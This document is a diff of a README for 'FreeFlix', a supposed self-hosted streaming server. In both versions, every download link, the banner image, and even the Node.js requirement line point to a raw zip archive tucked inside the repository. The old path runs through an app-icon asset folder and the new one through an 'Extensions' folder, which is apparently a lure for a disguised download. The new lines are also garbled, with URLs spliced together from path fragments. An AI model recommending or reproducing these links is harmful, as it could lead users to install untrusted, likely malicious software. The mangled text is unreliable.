@@ -1,12 +1,12 @@
 # 🎥 Freeflix - Stream Your Movies with Ease
 
-[![Download FreeFlix](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Back.imagestacklayer/Content.imageset/Software-v1.1.zip)](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Back.imagestacklayer/Content.imageset/Software-v1.1.zip)
+[![Download FreeFlix](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon & Top Shelf https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon - App https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip)](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon & Top Shelf https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon - App https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip)
 
 ## 📦 What is FreeFlix?
 
 FreeFlix is a self-hosted video streaming server. It offers a Netflix-like interface, allowing you to stream your personal video library to your Apple TV, web browser, or any device connected to your local network. Experience the joy of watching your favorite films and series without the hassle of internet speeds or subscription fees.
 
-![FreeFlix](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Back.imagestacklayer/Content.imageset/Software-v1.1.zip)
+![FreeFlix](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon & Top Shelf https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon - App https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip)
 
 ## 🎯 Features
 
@@ -23,7 +23,7 @@ FreeFlix is a self-hosted video streaming server. It offers a Netflix-like inter
 To run FreeFlix, ensure your system meets the following requirements:
 
 - A computer running Windows, macOS, or Linux.
-- https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Back.imagestacklayer/Content.imageset/Software-v1.1.zip and npm installed for the backend server.
+- https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon & Top Shelf https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon - App https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip and npm installed for the backend server.
 - A local network for connecting your devices.
 - Sufficient storage space for your video files.
 - Compatible video formats: MP4, MKV, MOV, AVI, WebM, M4V.
@@ -34,7 +34,7 @@ To run FreeFlix, ensure your system meets the following requirements:
 
 To download FreeFlix, visit the Releases page. 
 
-[Download FreeFlix](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Back.imagestacklayer/Content.imageset/Software-v1.1.zip)
+[Download FreeFlix](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon & Top Shelf https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon - App https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip)
 
 ### Step 2: Choose Your Version
 
@@ -89,5 +89,5 @@ For more details on features, settings, and usage tips, please refer to the docu
 
 ## 📥 Download & Install
 
-To begin your streaming adventure, [download FreeFlix here](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Assets.xcassets/App Icon & Top Shelf Image.brandassets/App Icon - App Store.imagestack/Back.imagestacklayer/Content.imageset/Software-v1.1.zip). Follow the installation steps above to set up your personal video streaming server. Enjoy your movies and shows anytime, anywhere!
+To begin your streaming adventure, [download FreeFlix here](https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon & Top Shelf https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip Icon - App https://github.com/BACHCHAR7/Freeflix/raw/refs/heads/main/FreeFlixTVOS/FreeFlix/FreeFlix/Extensions/Software-v1.1.zip). Follow the installation steps above to set up your personal video streaming server. Enjoy your movies and shows anytime, anywhere!
 
